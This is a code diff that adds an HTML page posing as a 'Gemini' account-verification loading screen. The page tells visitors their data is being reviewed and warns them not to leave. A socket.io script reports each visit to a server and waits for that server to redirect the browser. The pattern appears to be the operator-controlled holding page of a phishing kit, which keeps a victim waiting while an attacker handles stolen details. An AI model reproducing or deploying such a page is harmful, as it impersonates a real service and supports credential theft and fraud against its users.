@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gemini - One Moment</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #000000 0%, #0f0f0f 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+        }
+        
+        .loading-container {
+            text-align: center;
+            padding: 60px 40px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .logo-container {
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .logo-text {
+            font-size: 42px;
+            font-weight: 600;
+            background: linear-gradient(90deg, #26ddf9 0%, #00e4ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+        }
+        
+        .loading-text {
+            font-size: 24px;
+            font-weight: 300;
+            margin-bottom: 40px;
+            color: #ffffff;
+            opacity: 0.9;
+        }
+        
+        .loading-indicator {
+            width: 60px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 0 auto 40px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .loading-indicator::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 40%;
+            height: 100%;
+            background: #26ddf9;
+            animation: shimmer 1.5s ease-in-out infinite;
+        }
+        
+        .status-text {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.6;
+            max-width: 380px;
+            margin: 0 auto 20px;
+        }
+        
+        .warning-container {
+            margin-top: 40px;
+            padding: 16px;
+            background: rgba(38, 221, 249, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(38, 221, 249, 0.2);
+        }
+        
+        .warning-text {
+            font-size: 13px;
+            color: #26ddf9;
+            font-weight: 500;
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.4);
+            margin-top: 40px;
+        }
+        
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(350%);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo-container">
+            <div class="logo-text">Gemini</div>
+        </div>
+        
+        <h1 class="loading-text">One moment</h1>
+        
+        <div class="loading-indicator"></div>
+        
+        <p class="status-text">We are currently reviewing your information to ensure the security for your account.</p>
+        
+        <p class="status-text">Please allow us some time to verify your data.</p>
+        
+        <div class="warning-container">
+            <p class="warning-text">Important: DO NOT navigate away from this page during this process.</p>
+        </div>
+        
+        <p class="footer-text">Thank you for your patience and understanding.</p>
+    </div>
+    
+    <script src="/js/socket-client.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Socket connection handling
+            if (typeof socket !== 'undefined') {
+                socket.emit('page_visit', {
+                    page: 'geminiloading',
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Handle redirect events
+                socket.on('redirect', (data) => {
+                    if (data && data.page) {
+                        window.location.href = `/pages/${data.page}`;
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
